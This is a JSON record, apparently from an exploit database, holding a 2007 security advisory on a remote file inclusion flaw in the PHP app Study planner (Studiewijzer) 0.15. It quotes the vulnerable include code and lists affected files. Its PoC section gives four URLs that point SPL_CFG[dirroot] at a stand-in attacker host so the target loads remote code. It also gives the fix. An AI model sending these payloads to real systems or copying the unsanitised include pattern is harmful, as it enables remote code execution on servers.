{
  "id": "3532",
  "title": "study planner (studiewijzer) 0.15 - Remote File Inclusion",
  "cve": "CVE-2007-1628",
  "vuln_type": "rce",
  "code": "____________________   ___ ___ ________\r\n\\_   _____/\\_   ___ \\ /   |   \\\\_____  \\  \r\n |    __)_ /    \\  \\//    ~    \\/   |   \\ \r\n |        \\\\     \\___\\    Y    /    |    \\\r\n/_______  / \\______  /\\___|_  /\\_______  /\r\n        \\/         \\/       \\/         \\/ \r\n\r\n                                        .OR.ID\r\nECHO_ADV_77$2007\r\n\r\n-----------------------------------------------------------------------------------------\r\n[ECHO_ADV_77$2007] Study planner (Studiewijzer) <= 0.15 Remote File Inclusion Vulnerability\r\n-----------------------------------------------------------------------------------------\r\n\r\nAuthor         : M.Hasran Addahroni\r\nDate           : March, 21th 2007\r\nLocation       : Australia, Sydney\r\nWeb            : http://advisories.echo.or.id/adv/adv77-K-159-2007.txt\r\nCritical Lvl   : Dangerous\r\nImpact\t       : System access\r\nWhere\t       : From Remote\r\n---------------------------------------------------------------------------\r\n\r\nAffected software description:\r\n~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n\r\nApplication   : Study planner (Studiewijzer)  \r\nversion       : <= 0.15\r\nVendor        : http://www.studiewijzer.nl/\r\n                http://sourceforge.net/projects/splanner\r\nDescription :\r\n\r\nA study planner, helping students to choose and plan the appropriate actions or tasks in order to reach their goals (PHP based)\r\n\r\n---------------------------------------------------------------------------\r\n\r\nVulnerability:\r\n~~~~~~~~~~~~~\r\n- Invalid include function at inc/service.alert.inc.php :  \r\n  \t\r\n----------------inc/service.alert.inc.php-------------------\r\n<?php\r\n/**\r\n * Alerting service\r\n *\r\n * $Author: jebbol $\r\n * $Revision: 1.1 $\r\n * $Date: 2006/08/24 17:33:44 $\r\n *\r\n * @copyright Copyright (c) 2005-2006 Studiewijzer.nl\r\n * @link      http://www.studiewijzer.nl\r\n * @license   http://www.gnu.org/copyleft/gpl.html\r\n */\r\n\r\ninclude_once ($SPL_CFG['dirroot'].'/class/stu.class.php');\r\n...\r\n----------------------------------------------------------------\r\n\r\n\r\nVariables $SPL_CFG['dirroot'] is not properly sanitized.\r\nWhen register_globals=on and allow_fopenurl=on an attacker can exploit this vulnerability with a simple php injection script.\r\n\r\nalso affected files :\r\ninc/settings.ses.php\r\ndb/mysql/db.inc.php\r\nintegration/shortstat/configuration.php\r\nmethodology/traditional/class/ali.class.php\r\nmethodology/traditional/class/cat.class.php\r\nmethodology/traditional/ui/inc/cat_browse.inc.php\r\nmethodology/traditional/ui/inc/chr_browse.inc.php\r\nmethodology/traditional/ui/inc/chr_display.inc.php\r\nmethodology/traditional/ui/inc/dash_browse.inc.php\r\nws/spl.webservice.php\r\nws/konfabulator/gateway_admin.php\r\n\r\nand more ..\r\n\r\nPoc/Exploit:\r\n~~~~~~~~~\r\n\r\nhttp://www.target.com/[splanner_path]/inc/service.alert.inc.php?SPL_CFG[dirroot]=http://attacker.com/evil?\r\nhttp://www.target.com/[splanner_path]/inc/settings.ses.php?SPL_CFG[dirroot]=http://attacker.com/evil?\r\nhttp://www.target.com/[splanner_path]/db/mysql/db.inc.php?SPL_CFG[dirroot]=http://attacker.com/evil?\r\nhttp://www.target.com/[splanner_path]/integration/shortstat/configuration.php?SPL_CFG[dirroot]=http://attacker.com/evil?\r\n\r\n\r\n\r\nSolution:\r\n~~~~~~\r\n\r\n- Sanitize variable $SPL_CFG['dirroot'] on affected file.\r\n- Turn off register_globals\r\n\r\n---------------------------------------------------------------------------\r\n\r\nShoutz:\r\n~~~~\r\n~ ping - my dearest wife, and my little son, for all the luv the tears n the breath\r\n~ y3dips,the_day,moby,comex,z3r0byt3,c-a-s-e,S`to,lirva32,negative, str0ke (for the best comments)\r\n~ masterpop3,maSter-oP,Lieur-Euy,Mr_ny3m,bithedz,murp,an0maly,fleanux,baylaw\r\n~ SinChan,h4ntu,cow_1seng,sakitjiwa, m_beben, rizal, cR4SH3R, madkid, kuntua, stev_manado, nofry, x16\r\n~ newbie_hacker@yahoogroups.com\r\n~ #aikmel #e-c-h-o @irc.dal.net\r\n\r\n---------------------------------------------------------------------------\r\nContact:\r\n~~~~~\r\n\r\n     K-159 || echo|staff || eufrato[at]gmail[dot]com\r\n     Homepage: http://k-159.echo.or.id/\r\n\r\n-------------------------------- [ EOF ] ----------------------------------\r\n\r\n# milw0rm.com [2007-03-21]",
  "url": "https://www.exploit-db.com/exploits/3532"
}